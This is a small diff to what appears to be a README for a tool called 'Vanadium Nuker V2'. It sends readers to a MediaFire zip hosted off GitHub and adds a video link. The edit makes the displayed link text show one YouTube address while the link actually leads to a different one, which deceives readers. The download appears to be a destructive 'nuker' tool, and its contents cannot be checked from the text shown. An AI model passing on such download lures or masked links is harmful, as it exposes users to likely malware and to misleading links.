@@ -26,7 +26,7 @@ I'm sorry I can't upload the file to GitHub because the file size is 39 MB, and 
 
 
 # Watch this video 
-https://youtu.be/8l57Mxtu9pw?si=fRtKlFa6zDA2koEt
+[https://youtu.be/8l57Mxtu9pw?si=fRtKlFa6zDA2koEt](https://youtu.be/DmmYOXihPEQ?si=ofGtbtmNT5QpbNRB)
 
 # How To Download?
 https://www.mediafire.com/file/fwxdl3qadtfbcg0/Vanadium+Nuker+V2.zip/file
